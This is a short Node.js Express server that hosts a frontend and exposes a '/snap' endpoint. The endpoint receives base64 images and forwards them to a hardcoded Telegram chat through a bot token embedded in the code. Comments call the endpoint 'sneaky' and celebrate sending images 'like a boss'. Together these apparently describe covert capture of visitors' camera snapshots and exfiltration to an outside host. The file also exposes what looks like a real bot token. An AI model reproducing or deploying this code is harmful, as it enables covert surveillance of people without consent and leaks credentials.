const express = require('express');
const TelegramBot = require('telegram-bot-api');
const app = express();
const port = process.env.PORT || 3000;

// Replace with your bot TOKEN & CHAT_ID
const bot = new TelegramBot({ token: '8268626274:AAHy8elZIlhpGfcnQTcgtIwOPPp7n36pbB8' });
const chatId = '8381620130';

app.use(express.static('public')); // Host frontend
app.use(express.json());

// Sneaky endpoint to receive snaps 🎯
app.post('/snap', async (req, res) => {
  const image = req.body.image.replace(/^data:image\/\w+;base64,/, '');
  const buffer = Buffer.from(image, 'base64');
  
  // Send to Telegram like a boss 😈
  await bot.sendPhoto({ chat_id: chatId, photo: buffer });
  res.sendStatus(200);
});

app.listen(port, () => console.log(`😈 Server live on ${port}!`));
